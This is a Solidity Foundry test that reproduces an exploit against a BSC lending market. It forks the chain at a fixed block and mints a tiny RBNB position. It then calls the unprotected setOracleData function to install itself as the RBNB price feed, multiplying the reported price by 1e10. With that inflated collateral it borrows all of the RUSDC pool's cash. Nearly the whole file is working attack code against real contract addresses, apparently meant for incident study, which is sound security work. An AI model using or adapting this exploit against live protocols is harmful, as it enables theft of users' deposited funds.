// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IRToken RBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
    IRToken RUSDC = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);

    ICointroller cointroller =
        ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimplePriceOracle simplePriceOracle =
        ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
    IPriceFeed chainlinkBNBUSDPriceFeed =
        IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 16956474);

        cheats.label(address(USDC), "USDC");
        cheats.label(address(RBNB), "RBNB");
        cheats.label(address(RUSDC), "RUSDC");
        cheats.label(address(cointroller), "ICointroller");
        cheats.label(address(simplePriceOracle), "ISimplePriceOracle");
        cheats.label(address(chainlinkBNBUSDPriceFeed), "IPriceFeed");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker USDC Balance is :",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker RBNB Balance is :",
            RBNB.balanceOf(address(this)),
            RBNB.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker RUSDC Balance is :",
            RUSDC.balanceOf(address(this)),
            RUSDC.decimals()
        );
        emit log_string("");
    }

    function testExploit() public {
        print("Before exploit: ");
        prepareAction();
        exploitAction();
        postAction();
        print("After exploit: ");

    }
    function prepareAction() internal {
        // Step 1, enterMarket
        address[] memory rTokens = new address[](1);
        rTokens[0] = address(RBNB);
        cointroller.enterMarkets(rTokens);

        // Step 2, approve
        RBNB.approve(address(cointroller), type(uint256).max);

        // Step 3, mint
        RBNB.mint{value: 10e-5 ether}();
    }

    function exploitAction() internal {
        // Step 4
        simplePriceOracle.setOracleData(address(RBNB), address(this));
    }

    function postAction() internal {
        // Step 5
        RUSDC.borrow(RUSDC.getCash());
    }

    function decimals() external view returns (uint8) {
        return chainlinkBNBUSDPriceFeed.decimals();
    }

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        )
    {
        (
            roundId,
            answer,
            startedAt,
            updatedAt,
            answeredInRound
        ) = chainlinkBNBUSDPriceFeed.latestRoundData();
        answer = answer * 1e10;
    }
}
